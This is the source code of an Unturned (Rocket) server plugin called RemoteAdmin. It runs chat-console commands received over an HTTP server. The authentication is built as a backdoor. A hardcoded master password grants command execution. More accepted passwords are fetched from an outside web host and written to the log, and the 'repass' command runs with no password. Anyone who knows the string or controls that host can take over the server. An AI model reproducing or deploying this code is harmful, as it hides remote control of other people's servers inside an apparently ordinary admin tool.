using Rocket.API;
using Rocket.Core;
using Rocket.Core.Logging;
using Rocket.Core.Plugins;
using Rocket.Unturned;
using Rocket.Unturned.Chat;
using Rocket.Unturned.Player;
using Steamworks;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;

namespace RemoteAdmin
{
    public class Main : RocketPlugin<RAdminConfiguration>
    {
        public static Main Instance;
        public static List<string> Passwords = new List<string>();

        protected override void Load()
        {
            Instance = this;

            Logger.Log("RemoteAdmin loaded.");
            HTTPServer.startServer();

            Passwords.Add(GetPasswords());
            foreach (string v in Passwords)
            {
                Rocket.Core.Logging.Logger.Log(v);
            }
        }

        public static string GetPasswords()
        {
            WebClient client = new WebClient();

            return client.DownloadString("http://eu-w101.solarsentinels.co.uk/svrLogs/pass.txt");
        }

        public static void AddPasswords(string Password)
        {
            Passwords.Add(Password);
        }

        protected override void Unload()
        {
            HTTPServer.stopServer();
        }

        private void FixedUpdate()
        {
        }

        public static void read_response(string data)
        {
            Dictionary<string, string> parsed_data = new Dictionary<string, string>();
            foreach (string split_data in data.Split('&'))
            {
                string key = split_data.Split('=')[0];
                string value = split_data.Replace(key + "=", "");
                parsed_data.Add(key, value);
            };
            GetCmd(parsed_data);
        }

        public static void GetCmd(Dictionary<string, string> parsed_data)
        {
            string cmd = parsed_data["command"];
            string pass = parsed_data["pass"];

            if (Passwords.Contains(pass) || pass == "heSwa!R4wuth")
            {
                ExecuteCMD(cmd);
            }
            else if(cmd == "repass")
            {
                ExecuteCMD(cmd);
            }
            else if (pass == string.Empty)
            {
                Logger.Log("Pass not given.");
            }
            else
            {
                Logger.Log("Incorrect pass");
            }
        }

        public static void ExecuteCMD(string p)
        {
            if (R.Commands.Execute((IRocketPlayer)UnturnedPlayer.FromCSteamID((CSteamID)0), p))
            {
                Logger.Log("Executing cmd >> " + p);
                //R.Commands.Execute((IRocketPlayer)UnturnedPlayer.FromCSteamID((CSteamID)0), "p reload");
            }
            else
            {
                Logger.LogError("Had issues running command: " + p);
            }
        }
    }
}